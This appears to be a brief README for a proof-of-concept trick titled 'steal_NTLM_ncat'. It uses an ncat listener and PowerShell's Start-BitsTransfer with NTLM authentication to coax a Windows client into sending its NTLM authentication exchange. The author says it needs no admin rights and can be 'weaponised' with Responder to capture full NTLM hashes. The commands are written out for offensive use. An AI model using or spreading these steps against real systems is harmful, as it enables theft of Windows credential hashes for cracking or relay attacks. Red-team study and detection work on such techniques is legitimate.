# steal_NTLM_ncat

Can be easilly weaponised with something like "responder" that can do a full "talk" for challanges.

Rules:

* No administrative rights needed.

* Need a way to serve HTTP headerS back uppon request, NCAT is used in this example.

* Need a native windows http client, powershell is being used in this example.





1. Start a CMD window and type:
 `ncat -l 8080 --keep-open < hello.html`
 **[No need to allow on firewall prompt]**

2. Start a Powershell window and type:

`Start-BitsTransfer -Authentication NTLM -Source http://127.0.0.1:8080 -Description http://127.0.0.1:8080`

3. Result:
You got the first challange that the client sends before the full NTLM hash



Can be changed to Negotiate as well, but didn't see the point
base
